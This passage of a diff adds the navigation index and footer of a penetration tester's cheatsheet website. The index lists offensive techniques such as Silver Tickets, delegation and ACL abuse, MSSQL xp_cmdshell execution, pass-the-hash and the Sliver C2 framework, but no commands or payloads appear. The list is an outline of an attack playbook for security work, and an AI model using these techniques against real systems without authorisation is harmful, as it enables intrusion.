+        <a href="#adx-silver-ticket">7.7 Silver Ticket</a>
+        <a href="#adx-rbcd">7.8 Resource-Based Constrained Delegation</a>
+        <a href="#adx-shadow-creds">7.9 Shadow Credentials</a>
+        <a href="#adx-acl-abuse">7.10 ACL Abuse</a>
+        <a href="#adx-gpo-abuse">7.11 GPO Abuse</a>
+        <a href="#adx-cross-trust">7.12 Cross-Trust Attacks</a>
+        <a href="#adx-laps">7.13 LAPS &amp; gMSA</a>
+      </div>
+    </div>
+
+    <div class="section-flow-8">
+      <button class="dropdown-btn">8. MSSQL
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#mssql-enum">8.1 Enumeration</a>
+        <a href="#mssql-xpcmdshell">8.2 Command Execution &mdash; xp_cmdshell</a>
+        <a href="#mssql-ole">8.3 Command Execution &mdash; Ole Automation</a>
+        <a href="#mssql-linked">8.4 Linked Servers</a>
+        <a href="#mssql-privesc">8.5 Privilege Escalation</a>
+        <a href="#mssql-clr">8.6 CLR Assembly Execution</a>
+        <a href="#mssql-quick-ref">8.7 Quick Reference</a>
+      </div>
+    </div>
+
+    <div class="section-flow-9">
+      <button class="dropdown-btn">9. Lateral Movement
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#lm-pth">9.1 Pass-the-Hash</a>
+        <a href="#lm-overpass">9.2 Overpass-the-Hash</a>
+        <a href="#lm-dcom">9.3 DCOM Execution</a>
+        <a href="#lm-winrm">9.4 WinRM</a>
+        <a href="#lm-pivoting-through-hosts">9.5 Pivoting Through Compromised Hosts</a>
+      </div>
+    </div>
+
+    <div class="section-flow-10">
+      <button class="dropdown-btn">10. Utilities
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#util-sliver">10.1 Sliver C2</a>
+        <a href="#util-impacket">10.2 Impacket Suite</a>
+        <a href="#util-bloodyad">10.3 BloodyAD Commands</a>
+        <a href="#util-hashcracking">10.4 Hash Cracking Reference</a>
+        <a href="#util-file-transfer">10.5 File Transfer Cheatsheet</a>
+      </div>
+    </div>
+  </div>
+  <!-- End Index -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="credits">
+        <p>
+          &copy; Wencheng Xue<br>
+          Penetration Tester &amp; Vulnerability Researcher
+        </p>
+      </div>
+    </div>
+  </footer><!-- End  Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script defer src="./vendor/aos/aos.js"></script>
+  <script defer src="./vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script defer src="./vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script defer src="./vendor/typed.js/typed.min.js"></script>
+  <!-- Prism JS -->
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-csharp.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-python.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-c.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-cpp.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-sql.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-javascript.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-java.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-markup-templating.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-php.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-visual-basic.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-ini.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-nginx.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-nim.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script defer src="./js/main.js"></script>
+
+  <!-- Prism JS Additional Keywords-->
+  <script defer src="js/prism-langs.js"></script>
+
+  <script defer src="js/site.js"></script>
+  <script defer src="js/cheatsheet-index.js"></script>
+
+</body>
+
+</html>
